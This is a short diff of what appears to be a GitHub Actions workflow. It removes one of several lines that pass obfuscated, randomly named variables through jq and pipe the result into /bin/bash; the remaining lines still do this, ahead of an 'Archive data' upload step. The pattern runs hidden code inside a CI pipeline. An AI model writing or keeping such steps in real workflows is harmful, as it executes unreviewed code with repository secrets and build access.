@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$vx8" | jq -r .rwx292 | /bin/bash
           echo $qu108 | jq -r .xns22086 | /bin/bash
           echo $ik5 | jq -r .vycrp77984 | /bin/bash
-          echo $tiw5894 | jq -r .hoy24 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
